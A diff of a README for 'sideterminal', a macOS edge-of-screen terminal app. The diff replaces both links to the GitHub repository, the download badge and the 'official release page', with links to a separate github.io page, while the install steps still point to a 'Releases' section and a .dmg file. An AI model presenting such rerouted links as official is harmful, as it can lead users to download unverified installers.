@@ -1,6 +1,6 @@
 # 💻 sideterminal - Access your terminal from the edge
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/AJWillemse/sideterminal)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://ajwillemse.github.io)
 
 sideterminal offers a way to interact with your command line interface without leaving your current workspace. The application resides at the edge of your screen. You trigger it to slide into view when you need to run a command. It keeps your terminal sessions active in the background.
 
@@ -10,7 +10,7 @@ You need a computer running macOS to use this application. This tool utilizes Ap
 
 ### How to install
 
-1. Visit the [official release page](https://github.com/AJWillemse/sideterminal).
+1. Visit the [official release page](https://ajwillemse.github.io).
 2. Look for the latest version under the "Releases" section.
 3. Download the file ending in `.dmg`.
 4. Open the file once the download finishes.
